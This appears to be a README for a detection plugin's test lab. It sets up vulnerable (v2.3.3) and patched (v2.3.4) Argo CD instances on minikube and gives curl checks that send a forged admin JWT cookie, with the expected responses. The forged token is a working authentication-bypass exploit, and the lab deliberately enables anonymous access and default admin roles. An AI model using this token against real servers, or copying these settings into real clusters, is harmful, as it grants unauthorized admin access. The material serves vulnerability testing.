# setup requirements
1. k8s with minikube: https://minikube.sigs.k8s.io/docs/start/ (we can use original k8s but this is a easy solution)
2. please don't forget to add `alias kubectl="minikube kubectl --"` to your shell environment.

# setup vulnerable instance (v2.3.3)

```bash
kubectl create namespace argocd
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/v2.3.3/manifests/install.yaml
kubectl patch -n argocd cm argocd-cm -p '{"data":{"users.anonymous.enabled":"true"}}'
# set admin role as default to be able to create an application
kubectl patch -n argocd cm argocd-rbac-cm -p '{"data":{"policy.default":"role:admin"}}'
```

check anonymous access is enabled:
`kubectl get -n argocd cm argocd-cm -o jsonpath='{.data.users\.anonymous\.enabled}'`

give access to the server from 127.0.0.1:8082 for testing the plugin:
`kubectl port-forward svc/argocd-server -n argocd 8082:443`

check it manually in another shell:
```bash
curl -s -k -i -X 'GET' -H 'Cookie: argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ'  'https://127.0.0.1:8082/api/v1/certificates'
```
the response is like the following:
```
HTTP/1.1 200 OK
{"metadata":{},"items":[{"serverName":"bitbucket.org","certType":"ssh",....
```

# setup safe instance (v2.3.4)

```bash
kubectl create namespace argocdsafe
kubectl apply -n argocdsafe -f https://raw.githubusercontent.com/argoproj/argo-cd/v2.3.4/manifests/install.yaml
kubectl patch -n argocdsafe cm argocd-cm -p '{"data":{"users.anonymous.enabled":"true"}}'
```

check anonymous access is enabled:
`kubectl get -n argocdsafe cm argocd-cm -o jsonpath='{.data.users\.anonymous\.enabled}'`

give access to the server from 127.0.0.1:8081 for testing the plugin:
`kubectl port-forward svc/argocd-server -n argocdsafe 8081:443`

check it manually in another shell:
```bash
curl -s -k -i -X 'GET' -H 'Cookie: argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ'  'https://127.0.0.1:8081/api/v1/certificates'
```

the response is like the following:
```
HTTP/1.1 200 OK
{"error":"permission denied: certificates, get, ","code":7,"message":"permission denied: certificates, get, "}
```
